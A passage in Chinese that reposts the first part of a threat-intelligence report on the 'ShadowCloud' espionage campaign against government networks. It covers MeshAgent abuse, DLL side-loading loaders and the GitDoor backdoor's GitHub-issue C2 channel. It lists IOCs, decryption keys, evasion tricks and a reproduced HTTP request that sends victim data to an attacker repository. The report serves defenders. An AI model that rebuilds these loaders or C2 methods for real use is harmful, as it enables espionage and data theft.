---
title: “ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第一部分
url: https://mp.weixin.qq.com/s/YqQ1jk8wjdqvkI2og10fBw
source: Doonsec's feed
date: 2026-11-18
fetch_date: 2026-11-19T09:44:22.853498
---

# “ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第一部分

# P1“ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第一部分

原创

GReAT
GReAT

网络与信息安全参考

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

QUOTE

当一台被感染的机器只需要读取一个公开仓库、在 issue 里打上一个标签就能领受指令时，网络边界上那些熟悉的检测规则，几乎全部失效了。

—— Saurabh Sharma & Noushin Shabab

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Oy7lbA08GzZqtxu3Rn0pfmtpHEIvrVdzyGicvzHQnnkOQybnwlESmSjbWPcScibgPXJjKxDr72gZkdImBZxKNgby3VGzsia2352kfic0hrjpRck/640?wx_fmt=webp&from=appmsg)

— 本文封面图｜图片来源：Kaspersky Securelist

2026 年初，我们发现了一场仍在活跃的入侵活动，将其命名为 Operation ShadowCloud。该活动背后的威胁行为者滥用合法的 MeshAgent 工具投递两个全新的后门。这些植入体将命令与控制（C2）流量隐藏在 **Microsoft SharePoint、GitHub 和 Ably** 等云服务之后，使植入体得以混入正常流量，从而有效规避基于网络的检测。

我们将这两个植入体命名为 **GraphDoor** 与 **GitDoor**，分别对应它们用于 C2 的云平台。尽管 C2 协议不同，两个后门共享几项关键能力：

**按需下载插件**：需要时再拉取额外模块

**内存中的 shellcode 注入**：把恶意代码直接载入内存以扩展功能，全程不落盘

威胁行为者还专门部署了修改版 Erfrp 客户端和基于 Ably 消息服务的插件，在受感染系统与 C2 服务器之间代理流量。

除插件之外，我们还发现了多个 shellcode 家族，其中大多数以 COFF（Common Object File Format，通用对象文件格式） 二进制形式投递。分析显示这是一套复杂的、模块化的工具集，仍在被持续维护与更新——我们在野外观察到了多个后门版本。受害者分布在亚洲与非洲，主要集中在政府部门。

在近期的一份简报中，Sophos 曾提及该活动的一个片段。在这篇分为两部分的博客中，我们将深入细节：后门的 C2 通信方式、威胁行为者投递到受害机器的各类 shellcode 家族与插件，以及我们观察到的、支撑这次行动的基础设施。我们同时给出归因线索：

本文（上篇）讨论初始感染向量、**GitDoor 后门**，以及威胁行为者投放到目标机器上的多个 shellcode 家族。

下篇将详述 **GraphDoor 后门**与插件套件（键盘记录、进程列表、屏幕截取、修改版 Erfrp 代理和 Ably 信道代理），并检视指向中文语种威胁组织的证据。

本文看点

01

一个合法远程管理工具，如何变成投递通道

02

把 GitHub issue 改造成命令总线

03

十六类自定义 shellcode 能力清单

01

INTRODUCTION

### 引言

这是一套把云平台当作信道的基础设施：不用自建 C2 服务器，只需一个 GitHub 账号、一个 Ably 应用，就能指挥一台位于政府内网的机器。上篇聚焦入侵的入口与 GitDoor。

在展开技术细节之前，先明确这次行动的整体形态：它不是单一恶意软件，而是一个持续迭代的工具矩阵——加载器换过实现，后门换过版本，shellcode 模块按需增补。这决定了防守方不能靠单条 IOC 解决问题，而要看行为链。

02

INITIAL INFECTION

### 初始感染

调查过程中，我们在中国台湾地区的一家机构内部发现了两个独立运行的 MeshCentral Agent（MD5：74b025084026d8d9a64661bf995d835b）。MeshCentral 是一款基于 Web 的工具，提供远程桌面控制、命令行访问和文件管理能力。

攻击者安装该 agent 的确切入口尚不明确，但证据指向对网络中已有的一次先前感染的复用。

该 MeshCentral Agent 被硬编码为连接远端服务器 wss://27.102.66[.]162:443/agent.ashx。C2 会话建立之后，攻击者利用这个 agent 在端点上下发了三个额外对象：

一个用于 **DLL 侧加载**的合法二进制文件

一个负责解包并执行后续代码的**恶意加载器 DLL**

一个包含核心载荷的**加密文件**

**第一例**：

INSTANCE 1

C:\windows\system32\start.exe: legitimate Sandboxie Start binary

C:\windows\system32\sbiedll.dll: malicious loader

C:\windows\system32\config.ini: encrypted backdoor file

**第二例**：

INSTANCE 2

C:\Windows\system32\dts\pc\apo4x\dtsapo4service.exe: legitimate Python application binary

C:\Windows\System32\dts\pc\apo4x\python39.dll: malicious loader

C:\windows\system32\dts\pc\apo4x\config.ini: encrypted backdoor file

威胁行为者使用受信任的可执行文件来侧加载恶意加载器 DLL。我们在这些攻击中识别出的加载器包括 jli.dll、SbieDll.dll、python39.dll、WINMM.dll 和 libcef.dll，它们被投放到主机上，随后由各自对应的合法二进制隐式加载：OpenJDK 平台二进制（javaw.exe，MD5：8b78ef5609d942036e93721d75bd1f29）、Sandboxie Start（start.exe，MD5：be739a7036dc8e2ee8608fba13c8c3a4）、一个 Python 应用（pythonw.exe，MD5：84802caf2579cfe7a38f079a64a3cd22），以及 Sysinternals 屏幕放大镜工具（zoomit.exe，MD5：d955d03104f988582cbd2967177693d3）——后者被攻击者注册为 Windows 服务启动。

注意：MeshAgent 与上述可执行文件本身都是合法软件。检测的落点不在文件名，而在「合法二进制 + 同名侧加载 DLL + 同级 config.ini」这一组合关系。

03

LOADERS

### 加载器

我们发现了两个不同的加载器，各自采用不同方法解码加密的后门载荷。两种情况下，加载器都先解密载荷，再把结果代码注入当前进程的内存。**1 型加载器**采用混合方案：先对数据施加 RC4 流密码，再叠加一层 XOR 掩码；**2 型加载器**则把流程简化为单一的 XOR 运算。

1 型加载器

MD5 32151547d912488ac5242731057170a3

加载器 jli.dll 通过原生 NtCreateFile/NtReadFile 调用读取同级目录下的 config.ini（MD5：3896d44bc6d517291c60ee3f70543a31），随后通过以下步骤转换所得数据，生成最终的后门：

使用自定义字符集（ABCDEFGHIJ01234ZYXWVUTSRQPONMLKzyxwvutsrqponmlkjihgfedcba98765/+）对数据做 Base64 解码

用 16 字节 RC4 密钥解密第一层加密，密钥因样本而异

用 16 字节 XOR 密钥解密第二层加密，密钥同样因样本而异

滥用 RtlEthernetAddressToStringA 与 RtlEthernetStringToAddressA 两个 API 转换解密后的后门字节，用以规避防御。首先用 RtlEthernetAddressToStringA 把解密后的后门字节转换成以太网 MAC 地址字符串。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Oy7lbA08GzYnWKAFNQUsQENMm0bHuq28oGRHYlERumtAUmCRtfDdMsIuMic4hlZXbLtMZKSkRNUEibWtB7cI6WlJ1tiaZa9UFFlOn7JcApQUmY/640?wx_fmt=png&from=appmsg)

— 图 1：把解密后的字节序列转换为 MAC 地址字符串。十六进制视图右侧已可读出形如 4D-5A-45-52-E8-0 的 MAC 串

随后用 RtlEthernetStringToAddressA 把人可读的 MAC 地址字符串翻译回六字节二进制格式，得到的字节被写入一块通过 AllocADsMem API 调用新分配的内存。

![](https://mmbiz.qpic.cn/mmbiz_png/Oy7lbA08GzZ5Gx2FlSzzBjlKKWrQeCl8OqYLThbK6OSd18Bcato6XxFu1zQ3Ud9hFe3ic9r2fGzlygFv7VEXfocaHzaiay5iaBoMSzJGQhKO6U/640?wx_fmt=png&from=appmsg)

— 图 2：把 MAC 地址字符串还原为字节。还原后的起始字节为 4D 5A（MZ），即一个 PE 映像的开头

最后，加载器用 VirtualProtect 把内存保护属性改为 PAGE\_EXECUTE\_READWRITE，并跳转到 MZ 头——该处充当进入引导代码的跳板。由于解密后的后门可执行文件已经是内存映射格式，引导代码只需完成重定位、解析导入，并根据载荷是 EXE 还是 DLL 来调用其入口点。引导代码动态解析 API 地址，并使用 CRC32 计算每个 API 名称的哈希。在解析之前，导入库名与对应的 API 名都会先用硬编码的 7 字节密钥 \x11\xAF\xCE\xDC\xA6\x12\x05 做 XOR 解密。

![](https://mmbiz.qpic.cn/mmbiz_png/Oy7lbA08GzbRbd8DlEvqBpCCSYWnWq1BbZj4Jla5bsvar7gBZBDUqrznjgWeBOAVicnNYfBjibKeeyDEDOyDHuEl7StH1FicP4gk8ichBgvmed8/640?wx_fmt=png&from=appmsg)

— 图 3：从 MZ 字节开始执行。以 4D 5A 打头，随后是定位自身基址、计算偏移并跳转至引导代码的指令序列

另一个同名的加载器 jli.dll（MD5：e9d4081fac4a5111e6856f333d490439）在 API 解析上采取了不同做法。它从 config.ini（MD5：b930fb3ab14fe45b378d5acfa6e0a763）读取一段加密 blob，解密后得到一个引导代码，以及一个后门可执行文件（GraphDoor，MD5：14ec33ea808e697870d00c5e434c2952）——该文件可以是 EXE，也可以是 DLL。引导代码使用 FNV-1 哈希解析所需 API；在 API 哈希函数中，FNV\_offset\_basis 的值会变化，但 FNV\_prime 常量始终为 0x1000193。所需函数解析完成后，引导代码创建一个名为 Local\sm%lu 的文件映射对象（其中 %lu 为当前 PID）。接着，它以反射方式把后门加载进自己的进程空间，并跳转到后门的入口点。若载荷是 DLL 且带有导出函数，则每个导出名都会用 FNV-1 哈希，并与硬编码值 0x974C9EB 比较，匹配即触发该导出。清理阶段，引导代码以 DLL\_PROCESS\_DETACH 调用 DLL 的 DllMain，通过 FreeLibrary 卸载已加载的库，并用 VirtualFree 释放已分配的内存。

2 型加载器

MD5 e63ec733393e4e7e3424cbff918003a3

该加载器内部名为 SbieDll\_st.dll。在尝试准备并执行后门之前，它会先在受感染的机器上做几项检查：首先在 KERNEL32.DLL 与 KernelBase.dll 中搜索字节序列 \x48\x83\xC4\x68\xC3——该序列反汇编后如下所示。

![](https://mmbiz.qpic.cn/mmbiz_png/Oy7lbA08GzZlKboZ2kPyt78P6epaGGRGJTj1BWnX4w4XqicJicTm9npXT1R9Vx6uLSFmiab8wkcmTjroJUMRojYtkOVcC69gg3dylMzVohOTHw/640?wx_fmt=png&from=appmsg)

— 图 4：模式反汇编。48 83 C4 68 对应 add rsp, 68h，C3 对应 retn

若找到该模式，代码会先安装一个向量化异常处理程序，并通过把 CONTEXT.DR7 寄存器清零来清除硬件断点。随后它校验当前进程名是否匹配硬编码值。通过这些检查之后，它读取模块目录下 config.ini（MD5：6a54f8008ee659b6923abf5dba2b2cc1）中的加密 blob，再按以下步骤转换数据：

Base64 解码

用硬编码的 16 字节密钥做 XOR 解密，密钥因样本而异

得到的结果是一个后门可执行文件（GitDoor，MD5：552f0a9cc5fc3755721fa49be05e8035）。加载器在当前进程中分配内存，把解密后的后门代码复制到该区域，并在 MZ 头处启动一个新线程——MZ 头充当跳板，进入与 1 型加载器完全相同的引导例程。在分配内存并执行后门代码之前，加载器会检查操作系统版本：在 Windows 8（6.2）或更新版本上，它使用原生 API NtAllocateVirtualMemory、RtlMoveMemory 和 NtCreateThreadEx 完成内存分配与代码执行；在更早的系统上，则回退到标准 API VirtualAlloc、RtlMoveMemory 和 CreateThread。

04

BACKDOORS

### 后门

GitDoor 与 GraphDoor 都采用了多种加密与混淆技术，其中包括控制流平坦化（Control Flow Flattening），用以掩盖真实的执行流。它们还大量使用间接调用：大多数例程被封装在多层辅助函数之中，彼此依次调用，形成额外的间接层级。核心载荷深藏于这些嵌套包装之内，分析人员必须逐层跟踪每一层包装才能理解后门的真实行为，这极大阻碍了静态分析。

执行过程被拆分到多个线程组件。每个线程都是 ably 命名空间中 Client 类的一个实例。类名与命名空间标识都来自经名称修饰（name mangling）的 C++ 线程函数名，而伴生的 lambda 名称则直接暴露了每个线程所实现的具体恶意能力。

GitDoor 后门

MD5 552f0a9cc5fc3755721fa49be05e8035

该后门首先解密联系 GitHub C2 所需的每一项要素——仓库 URL、个人访问令牌、User-Agent 字符串以及必要的 HTTP 头。后门使用两个不同的仓库：一个作为接收命令载荷的投放点，另一个用于上传命令执行结果。

/repos/LatonyCharnleyaW/Havo：下载命令数据与插件

/repos/LatonyCharnleyaW/Trix：上传受害者信息与命令结果

User-Agent 字符串为：

USER-AGENT

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)

Chrome/122.0.6261.96 Safari/537.36

后门解密硬编码的配置细节，把它们附加到已收集的受害者系统信息之后，再将合并后的数据上传到 GitHub 仓库以及 Ably 云——详细的准备与上传流程见下文。

**硬编码细节**

HARDCODED

"type":"serv"

"client\_version":"1.1.6"

"dhj\_exe":"start.exe"

"execution\_method":"1"

"is\_need\_lock":"false"

**受害者信息**

VICTIM INFO

Public IP

Internal IP

Domain

Username

Hostname

Current working directory

Backdoor process name and process ID

Windows version

CPU type

Running process name

后门会生成一个随机的八字符标识符，用于唯一标记被入侵主机，并创建一个新的 GUID 来标记当前通信会话。每次 HTTP 调用都会在 X-CSRF-TOKEN 头中插入一个新生成的随机字符串。随后，恶意软件向 GitHub 发出 POST 请求，利用 GitHub API 在属于 LatonyCharnleyaW 用户/组织的 Trix 仓库中开启一个新的 issue。该请求创建一条新的 GitHub issue，其标题与正文如下所示。恶意软件从 JSON 响应中提取 number 字段，即该 issue 的编号，用于后续请求。

Title："problem [GUID]"

Body："code [victim unique code]"

HTTP

POST /repos/LatonyCharnleyaW/Trix/issues

Host: api.github.com

Authorization: token %github\_pat\_token%

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

{"body":"code %v...